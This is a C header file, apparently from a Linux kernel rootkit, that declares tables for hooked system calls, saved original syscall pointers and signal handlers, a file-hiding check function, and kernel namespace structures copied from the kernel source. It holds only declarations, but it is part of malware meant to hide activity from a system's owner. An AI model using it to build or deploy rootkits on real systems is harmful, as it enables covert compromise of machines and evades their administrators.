#ifndef _ROOTKIT_SYSCALL_HOOKS_H_
#define _ROOTKIT_SYSCALL_HOOKS_H_

#include "hooked_syscalls.h"
#include "hooking.h"
#include "macro_utils.h"
#include "utils.h"
#include <asm/current.h>
#include <asm/unistd.h>
#include <linux/capability.h>
#include <linux/mnt_namespace.h>
#include <linux/mount.h>
#include <linux/ns_common.h>
#include <linux/spinlock_types.h>
#include <linux/types.h>
#include <linux/user_namespace.h>
#include <linux/wait.h>

#ifndef HOOKED_SYSCALLS
#define HOOKED_SYSCALLS
#endif

#define P_SYSCALL_HOOKS p_syscall_hooks /* Variable name for the syscall hook array */
#define P_ORIG_SYSFUNS  p_orig_sysfuns  /* Variable name for the original syscall functions array */
#define P_SIG_HANDLERS  p_sig_handlers  /* Variable name for the signal handler array */

#define AT_LOOKUP_CREATE 0x10000000 // Assume the file is being created

// Array of the original syscall function references.
extern sysfun_t P_ORIG_SYSFUNS[__NR_syscalls];

// Array of the syscall hooks.
extern hook_t P_SYSCALL_HOOKS[];

// Array of the signal handlers.
extern const signal_handler_t P_SIG_HANDLERS[];

DECLARE_HOOK_HANDLERS(HOOKED_SYSCALLS)

// Taken from fs/mount.h
struct mnt_namespace {
    struct ns_common ns;
    struct mount *root;
    /*
	 * Traversal and modification of .list is protected by either
	 * - taking namespace_sem for write, OR
	 * - taking namespace_sem for read AND taking .ns_lock.
	 */
    struct list_head list;
    spinlock_t ns_lock;
    struct user_namespace *user_ns;
    struct ucounts *ucounts;
    u64 seq; /* Sequence number to prevent loops */
    wait_queue_head_t poll;
    u64 event;
    unsigned int mounts; /* # of mounts in the namespace */
    unsigned int pending_mounts;
};

long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, const int i32_dfd,
                     const char __user *const s_filename, const int i32_at_flags);

// Taken from fs/namespace.c:1720
/*
 * Is the caller allowed to modify his namespace?
 */
static inline bool may_mount(void)
{
    return ns_capable(current->nsproxy->mnt_ns->user_ns, CAP_SYS_ADMIN);
}

#endif
